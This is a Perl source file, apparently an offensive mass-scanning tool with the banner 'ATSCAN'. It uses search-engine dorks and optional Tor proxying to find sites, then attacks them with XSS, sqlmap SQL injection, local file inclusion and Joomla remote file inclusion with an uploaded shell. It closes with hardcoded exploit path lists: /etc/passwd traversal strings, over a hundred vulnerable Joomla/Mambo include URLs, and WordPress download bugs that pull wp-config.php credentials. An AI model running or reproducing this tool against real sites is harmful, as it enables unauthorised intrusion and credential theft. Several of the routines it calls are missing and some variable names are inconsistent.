#!/usr/bin/perl
#Alisam Technology
#Requiered libreries
#apt-get install libxml-simple-perl
#aptitude install libio-socket-ssl-perl
#aptitude install libcrypt-ssleay-perl
use Term::ANSIColor;
use IO::Socket::INET;
use LWP::Simple;
use LWP::UserAgent;
my $ua = LWP::UserAgent->new;
$ua->timeout(30);
use File::Basename;
use FindBin '$Bin';
system(($^O eq 'MSWin32') ? 'cls' : 'clear');

print color 'bold cyan';
print "
   ...........................................................................
   ....###....########..######...######.....###....##....##......_....._......
   ...##.##......##....##....##.##....##...##.##...###...##.....(c).-.(c).....
   ..##...##.....##....##.......##........##...##..####..##......(.O_O.)......
   .##.....##....##.....######..##.......##.....##.##.##.##....__(( A ))__....
   .#########....##..........##.##.......#########.##..####...(_.-('-')-._)...
   .##.....##....##....##....##.##....##.##.....##.##...###......|| T ||......
   .##.....##....##.....######...######..##.....##.##....##...._.' `-' '._....
   ............................................................`-'-----`-'....
   ...........................................................................
\n";
print color RESET;

sub advise {
  print color 'yellow';
  print "[!] Upss.. Invalid arguments! \n";
  print "[!] Simple Usage: ./",basename($0)," \n";
  print "[!] Command line Usage: ./",basename($0)," <option> \n";
  print "[!] Help: ./",basename($0)," --help \n";
  print color RESET;
  exit;
}

use Getopt::Long ();
  
my $proxy;
my $help;
my $dork;
my $mpages;
my $mxss;
my $Target;
my $listname;
my $validation_text;
my $exploit;
my $sqlmap;
my $mlfi;
my $mjoomrfi;
my $shell;
my $mwpadf;
my $madmin;
my $msubdomain;
my $mports;
my $mstart;
my $mend;
my $mbasic;
my $mtcp;
my $mudp;
my $mall;
my $msites;
my $mwpsites;
my $mjoomsites;
my $muploadsites;
my $mzipsites;
my $string;
my $mhttpd;
my $mcommand;
my $mtarget;
my $misup;
my $mabout;

Getopt::Long::GetOptions(\my %OPT,
                        'tor' => \$proxy,
                        'help' => \$help,
                        's=s' => \$dork,
                        'mp=s' => \$mpages,
                        'xss' => \$mxss,
                        't=s' => \$Target,
                        'l=s' => \$listname,
                        'valid=s' => \$validation_text,
                        'exp=s' => \$exploit,
                        'sqlmap' => \$sqlmap,
                        'lfi' => \$mlfi,
                        'joomrfi' => \$mjoomrfi,
                        'shell=s' => \$shell,
                        'wpadf' => \$mwpadf,
                        'admin' => \$madmin,
						'shost' => \$msubdomain,
						'ports' => \$mports,
						'srart=s' => \$mstart,
						'end=s' => \$mend,
						'tcp' => \$mtcp,
						'udp' => \$mudp,
						'all' => \$mall,
						'basic' => \$mbasic,
						'sites' => \$msites,
						'wp' => \$mwpsites,
						'joom' => \$mjoomsites,
						'upload' => \$muploadsites,
						'zip' => \$mzipsites,
						'st=s' => \$string,
						'md5' => \$mmd5,
						'encode64' => \$mencode64,
						'decode64' => \$mencode64,
						'httpd' => \$mhttpd,
						'command=s' => \$mcommand,
						'TARGET' => \$mtarget,
						'isup' => \$misup,
						'about' => \$mabout,
) or advise();

if (@ARGV > 0){
  use Getopt::Long;
  GetOptions(\my %com,
            'help',
            's',
			'tor',
			'mp',
			'xss',
			't',
			'l',
			'xss',
			'valid',
			'exp',
			'sqlmap',
			'lfi',
			'joomrfi',
			'shell',
			'wpadf',
			'admin',
			'shost',
			'ports',
			'start',
			'end',
			'tcp',
			'udp',
			'basic',
			'all',
			'sites',
			'wp',
			'joom',
			'uplod',
			'zip',
			'encode64',
			'decode64',
			'md5',
			'st',
			'httpd',
			'command',
			'TARGET',
			'isup',
			'about',
  );
  
  if (!exists $com{help || tor || s || mp || xss || t || l || xss || valid || exp || sqlmap || lfi || joomrfi || shell || wpadf || admin || shost || ports || start || end || tcp || udp || basic || all || sites || wp || joom || zip || upload || md5 || decode64 || encode64 || st || httpd || command || TARGET || isup || about}) {
	advise();
  }
}

### set tor proxy
if (defined $proxy) {
  my $proxy="socks://localhost:9050";
  $ua->proxy([qw/ http https /] => $proxy);
  $ua->cookie_jar({});
}

print color 'yellow';
print "[!] Checking Connection Please Wait...\n";
print color 'RESET';
sleep(1);
my $URL = "http://www.google.com";
$request = HTTP::Request->new('GET', $URL);
$response = $ua->request($request);
if ( !$response->is_success ) {
  sleep(1);
  print color 'red';
  print "    [!] Upss.. Your Internet connection seems not active!\n";
  print "    [!] Check Your Connection OR Proxy Setting!\n";
  print color 'RESET';
  sleep(2);
}else{
  if (defined $proxy) {
    print color 'green';
    print "[!] OK! Connection Established using Proxy!\n";
    print color 'RESET';
  }else{
    print color 'green';
    print "[!] OK! Connection Established!\n";
    print color 'RESET';
  }
  print "[+] ::::::::::::::::::::::::::::::::::::::\n";
}  
###################################################

if (defined $help) {help(); exit();}

if ((defined $dork) && (defined $exploit)) {
  if ((!defined $misup) && (!defined $validation_text)){
      print color 'yellow';
      print "    [!] You have to set Validation Mode! [--isup / --valid <txt>]\n";
      print color RESET;
	  exit();
  }
}
if (defined $dork) {
  $listname = "Search_Scan.txt";
  if (!defined $mpages) {
    print color 'yellow';
    print "    [!] You have to set number of page results to scan!! [Ex: --mp 2]\n";
    print color 'RESET';
	exit();
  }
}
   
if (defined $dork) {
  if (defined $mxss) {
    submsearch();
    if (defined $sqlmap) {
      if (defined $proxy) {
        if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); sqlmaptor(); exit();}
        if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); sqlmaptor(); exit();}
        if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); sqlmaptor(); exit();}
	  }else{
        if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); sqlmap(); exit();}
        if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); sqlmap(); exit();}
        if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); sqlmap(); exit();}
	  }
    }else{
      if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); exit();}
      if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); exit();}
      if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); exit();}
    }
  }
  if (defined $mcommand) {
    if (!defined $mtarget) {
      print color 'yellow';
      print "    [!] You have to set Target!! [Ex: --command <your command> --TARGET]\n";
      print color 'RESET';
	  exit();
    }
    mcommand();
	exit();
  }
  if ((!defined $mxss) && (!defined $mcommand)) {
    submsearch();
	exit();
  }
}

if (defined $mxss) {
  if ((!defined $listname) && (!defined $Target)){
    print color 'yellow';
    print "    [!] You have to set Target/list! [Ex: -l list.txt/ -t target]\n";
    print color 'RESET';
	exit();
  }  
  if (defined $listname) {
    if (defined $sqlmap) {
      if (defined $proxy) {
        if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); sqlmaptor(); exit();}
        if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); sqlmaptor(); exit();}
        if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); sqlmaptor(); exit();}

	  }else{
        if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); sqlmap(); exit();}
        if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); sqlmap(); exit();}
        if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); sqlmap(); exit();}
	  }
	}else{
      if ((!defined $exploit) && (!defined $validation_text)) { mLXss(); exit();}
      if ((defined $exploit) && (!defined $validation_text)) { mLexplXss(); exit();}
      if ((defined $exploit) && (defined $validation_text)) { mLexplVaXss(); exit();}
	}
  }
  
  if (defined $Target) {
    if (defined $sqlmap) {
      if (defined $proxy) {
        if ((!defined $exploit) && (!defined $validation_text)) { mtXss(); sqlmaptor(); exit();}
        if ((defined $exploit) && (!defined $validation_text)) { mtexplXss(); sqlmaptor(); exit();}
        if ((defined $exploit) && (defined $validation_text)) { mtexplVaXss(); sqlmaptor(); exit(); }
	  }else{
        if ((!defined $exploit) && (!defined $validation_text)) { mtXss(); sqlmap(); exit();}
        if ((defined $exploit) && (!defined $validation_text)) { mtexplXss(); sqlmap(); exit();}
        if ((defined $exploit) && (defined $validation_text)) { mtexplVaXss(); sqlmap(); exit(); }
	  }
	}else{
      if ((!defined $exploit) && (!defined $validation_text)) { mtXss(); exit();}
      if ((defined $exploit) && (!defined $validation_text)) { mtexplXss(); exit();}
      if ((defined $exploit) && (defined $validation_text)) { mtexplVaXss(); exit(); }
	}
  }
}  
 
if (defined $mlfi) {
  if ((!defined $listname) && (!defined $Target)) {
    print color 'yellow';
    print "    [!] You have to set Target/list! [Ex: -l list.txt/ -t target]\n";
    print color 'RESET';
	exit();
  }
  if (defined $listname) { mlistLfi(); exit(); }
  if (defined $Target) { mtLfi(); exit(); }
}

if (defined $mjoomrfi) {
  if ((!defined $listname) && (!defined $Target) && (!defined $shell)) {
    print color 'yellow';
    print "    [!] You have to set Target/list + shell! [Ex: -l list.txt/-t target --shell]\n";
    print color 'RESET';
	exit();
  }
  if ((defined $listname) && (defined $shell)) { mljoomrfi(); exit(); }
  if ((defined $Target) && (defined $shell)){ mtjoomrfi(); exit(); }
}

if (defined $mwpadf) {
  if ((!defined $listname) || (!defined $Target)) {
    print color 'yellow';
    print "    [!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
    print color 'RESET';
	exit();
  }
  if (defined $listname) { mlwprfi(); exit(); }
  if (defined $Target){ mtwprfi(); exit(); }
}

if (defined $madmin) {
  if ((!defined $listname) && (!defined $Target)) {
    print color 'yellow';
    print "    [!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
    print color 'RESET';
	exit();
  }
  if (defined $listname) { mladmin(); exit(); }
  if (defined $Target){ mtadmin(); exit(); }
}

if (defined $msubdomain) {
  if ((!defined $listname) && (!defined $Target)) {
    print color 'yellow';
    print "    [!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
    print color 'RESET';
	exit();
  }
  if (defined $listname) { mlsubdomain(); exit(); }
  if (defined $Target){ mtsubdomain(); exit(); }
}

if (defined $mip) {
  if (!defined $host) {
    print color 'yellow';
    print "    [!] You have to set a server ip! [Ex: -h 16.12.01.82]\n";
    print color 'RESET';
	exit();
  }
  if (defined $host) { mlsubdomain(); exit(); }
  if (defined $Target){ mtsubdomain(); exit(); }
}

if (defined $mports) {
  if (!defined $Target) {
    print color 'yellow';
    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
    print color 'RESET';
	exit();
  }
  if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
    if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
      print color 'red';
      print "    [!] The given IP is not valid!\n";
      print color RESET;
	  exit();
	}
  }
  if (defined $Target) {
    if (defined $mbasic) {
	  if ((!defined $mtcp) && (!defined $mudp)) {
        print color 'yellow';
        print "    [!] Set a ports type! [Ex: --tcp / --udp / --tcp --udp ]\n";
        print color 'RESET';
	    exit();
	  }
      if (defined $mtcp) { basic('tcp'); exit(); }
      if (defined $mudp) { basic('udp'); exit(); }
      if ((defined $mtcp) && (defined $mudp)) { basic2(); exit(); }
	}
    if (defined $mall) {
      if (defined $mtcp) { complete('tcp'); exit(); }
      if (defined $mudp) { complete('udp'); exit(); }
      if ((defined $mtcp) && (defined $mudp)) { complete2(); exit(); }
	}

    if ((!defined $mall) && (!defined $mbasic)) {
	  if ((!defined $mstart) && (!defined $mend)) { 
        print color 'yellow';
        print "    [!] Set a ports range! [Ex: --start 21 --end 81]\n";
		print "    [!] Or choose Basic/Complete mode![Ex: --basic / --all]\n";
        print color 'RESET';
	    exit();
      }else{
        if (defined $mtcp) { user('tcp'); exit(); }
        if (defined $mudp) { user('udp'); exit(); }
        if ((defined $mtcp) && (defined $mudp)) { user2(); exit(); }
	  }
	}
  }
}

if (defined $msites) {
  if (!defined $Target) {
    print color 'yellow';
    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
    print color 'RESET';
	exit();
  }
  if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
    if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
      print color 'red';
      print "    [!] The given IP is not valid!\n";
      print color RESET;
	  exit();
    }
  }
  if (!defined $mpages) {
    print color 'yellow';
    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
    print color 'RESET';
	exit();
  }
  submsites(); exit();
}

if (defined $mwpsites) {
  if (!defined $Target){
    print color 'yellow';
    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
    print color 'RESET';
	exit();
  }
  if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
    if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
      print color 'red';
      print "    [!] The given IP is not valid!\n";
      print color RESET;
	  exit();
    }
  }
  if (!defined $mpages) {
    print color 'yellow';
    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
    print color 'RESET';
	exit();
  }
  mwpsites(); exit();
}

if (defined $mjoomsites) {
  if (!defined $Target) {
    print color 'yellow';
    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
    print color 'RESET';
	exit();
  }
  if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
    if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
      print color 'red';
      print "    [!] The given IP is not valid!\n";
      print color RESET;
	  exit();
    }
  }
  if (!defined $mpages) {
    print color 'yellow';
    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
    print color 'RESET';
	exit();
  }
  mjoomsites(); exit();
}

if (defined $muplodsites) {
  if (!defined $Target) {
    print color 'yellow';
    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
    print color 'RESET';
	exit();
  }
  if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
    if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
      print color 'red';
      print "    [!] The given IP is not valid!\n";
      print color RESET;
	  exit();
    }
  }
  if (!defined $mpages) {
    print color 'yellow';
    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
    print color 'RESET';
	exit();
  }
  muploadsites(); exit();
}

if (defined $mzipsites) {
  if (!defined $Target) {
    print color 'yellow';
    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
    print color 'RESET';
	exit();
  }
  if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
    if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
      print color 'red';
      print "    [!] The given IP is not valid!\n";
      print color RESET;
	  exit();
    }
  }
  if (!defined $mpages) {
    print color 'yellow';

    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
    print color 'RESET';
	exit();
  }
  mzipsites(); exit();
}

if (defined $mmd5) {
  if (!defined $string) {
    print color 'yellow';
    print "    [!] You have to set a string!!\n";
    print color 'RESET';
	exit();
  }
  mmd5();exit();
}

if (defined $mencode64) {
  if (!defined $string) {
    print color 'yellow';
    print "    [!] You have to set a string!!\n";
    print color 'RESET';
	exit();
  }
  mencode64();exit();
}

if (defined $mdecode64) {
  if (!defined $string) {
    print color 'yellow';
    print "    [!] You have to set a string!!\n";
    print color 'RESET';
	exit();
  }
  mdecode64();exit();
}

if (defined $mhttpd) {
  if (!defined $Target) {
    print color 'yellow';
    print "    [!] You have to set a target!!\n";
    print color 'RESET';
	exit();
  }
  mhttpd();exit();
}

if (!defined $dork) {
  if (defined $exploit) {
    if ((!defined $misup) && (!defined $validation_text)){
      print color 'yellow';
      print "    [!] You have to set a Validation [--isup / --valid <txt>]!!\n";
      print color 'RESET';
	  exit();
	}
	
	if (defined $misup) {
      if (defined $listname) {
        mlisup();
        exit();
	  }
      if (defined $Target) {
        mtisup();
        exit();
      }
    }
	
	if (defined $validation_text) {
      if (defined $listname) {
        mlvalidation();
        exit();
	  }
      if (defined $Target) {
        mtvalidation();
        exit();
      }
    }
  }
}

if (defined $mabout) {
  mabout();
  exit;
}

#######################################################
#######################################################

sub LFI {@LFI =("/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00");}
@LFI =("/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00");

sub XSS {@XSS = ("%27");}

sub RFI {@RFI = ("/components/com_flyspray/startdown.php?file=", "/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=", "/components/com_simpleboard/file_upload.php?sbp=", "/components/com_hashcash/server.php?mosConfig_absolute_path=", "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=", "/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=", "/components/com_performs/performs.php?mosConfig_absolute_path=", "/components/com_forum/download.php?phpbb_root_path=", "/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=", "/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=", "/components/minibb/index.php?absolute_path=", "/components/com_smf/smf.php?mosConfig_absolute_path=", "/modules/mod_calendar.php?absolute_path=", "/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=", "/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=", "/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=", "/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=", "/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=", "/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=", "/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=", "/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=", "/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=", "/components/com_securityimages/configinsert.php?mosConfig_absolute_path=", "/components/com_securityimages/lang.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/components/com_galleria/galleria.html.php?mosConfig_absolute_path=", "/akocomments.php?mosConfig_absolute_path=", "/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=", "/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=", "/components/com_zoom/includes/database.php?mosConfig_absolute_path=", "/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=", "/components/com_fm/fm.install.php?lm_absolute_path=", "/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=", "/components/com_lmo/lmo.php?mosConfig_absolute_path=", "/administrator/components/com_webring/admin.webring.docs.php?component_dir=", "/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=", "/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=", "/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/components/com_mambowiki/MamboLogin.php?IP=", "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=", "/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=", "/components/com_cpg/cpg.php?mosConfig_absolute_path=", "/components/com_moodle/moodle.php?mosConfig_absolute_path=", "/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=", "/components/com_mospray/scripts/admin.php?basedir=", "/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=", "/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=", "/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=", "/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=", "/components/com_madeira/img.php?url=", "/components/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=", "/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=", "/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/components/com_facileforms/facileforms.frame.php?ff_compath=", "/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=", "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=", "/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=", "/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=", "/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=", "/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=", "/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=", "/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=", "/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=", "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=", "/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_joomlaboard/file_upload.php?sbp=", "/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=", "/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=", "/modules/mod_as_category.php?mosConfig_absolute_path=", "/components/com_articles.php?absolute_path=", "/classes/html/com_articles.php?absolute_path=", "/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=", "/templates/be2004-2/index.php?mosConfig_absolute_path=", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=", "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=", "/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=", "/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=", "/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=", "/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=", "/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=", "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=", "/components/com_mp3_allopass/allopass.php?mosConfig_live_site=", "/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=", "/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolte_path=", "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_color/admin.color.php?mosConfig_live_site=", "/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=", "/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=", "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&mosConfig_absolute_path=", "/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=", "/com_magazine_3_0_1/magazine.functions.php?config=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=", "/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");
}

#ADF WP WORDPRESS
sub ADFWP {@ADFWP =("/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
"/wp-content/force-download.php?file=../wp-config.php",
"/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php",
"/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php",
"/wp-content/themes/markant/download.php?file=../../wp-config.php",
"/wp-content/themes/yakimabait/download.php?file=./wp-config.php",
"/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php",
"/wp-content/themes/felis/download.php?file=../wp-config.php",
"/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php",
"/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/epic/includes/download.php?file=wp-config.php",
"/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php",
"/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php",
"/wp-content/themes/lote27/download.php?download=../../../wp-config.php",
"/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php",
"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php",
"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php",
"/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php");
}

